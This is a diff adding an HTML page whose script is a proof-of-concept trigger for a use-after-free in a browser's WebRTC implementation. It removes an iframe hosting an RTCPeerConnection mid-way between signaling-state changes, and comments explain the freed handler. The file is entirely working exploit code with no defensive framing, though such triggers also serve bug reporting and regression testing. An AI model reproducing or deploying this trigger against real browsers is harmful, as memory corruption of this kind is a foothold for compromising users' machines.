@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      function trigger_vuln(){
+        iframe = document.createElement( "iframe");
+        iframe.height = 50;
+        iframe.width = 50;
+        document.body.appendChild( iframe );
+
+        peerconnection = new iframe.contentWindow.RTCPeerConnection();
+
+        var singnaling_count = 0;
+        peerconnection.onsignalingstatechange = _ => {
+          if( singnaling_count ==  1 )
+          {
+            iframe.remove();
+          }
+          singnaling_count ++;
+        };
+
+        var offer_option = { offerToReceiveAudio : true };
+        peerconnection.createOffer( offer_option ).then(
+          function( offer ){
+            // Change the signaling state kStable => kHaveLocalOffer
+            peerconnection.setLocalDescription( offer ).then( _ => {
+              console.log( "[*]\t setLocalDescription success." );
+              genAudioRecvOnlyOffer( peerconnection ).then(
+                function( offer ){
+                  // Change the signaling state kHaveLocalOffer => kStable => kHaveRemoteOffer
+                  // Freeing RTCPeerConnectionHandler between kHaveLocalOffer => kStable and kStable => kHaveRemoteOffer
+                  // can cause use-after-free
+                  peerconnection.setRemoteDescription( offer ).then( _ => { console.log("[*]\tsetRemoteDescription success"); } );
+                },
+                function(){
+                  console.log("[*]\t setRemoteDescription failed.");
+                }
+              );
+            });
+          },
+          function(){
+              console.log("[*]\t setLocalDescription failed.");
+          }
+        );
+      }
+
+      function genAudioRecvOnlyOffer( pc ){
+        try{
+          pc.addTransceiver('audio', {direction : 'recvonly' } );
+          return pc.createOffer();
+        }catch( e ){
+          return pc.createOffer({ offerToReceiveAudio : true });
+        }
+      }
+      
+      trigger_vuln();
+    </script>
+  </body>
+</html>
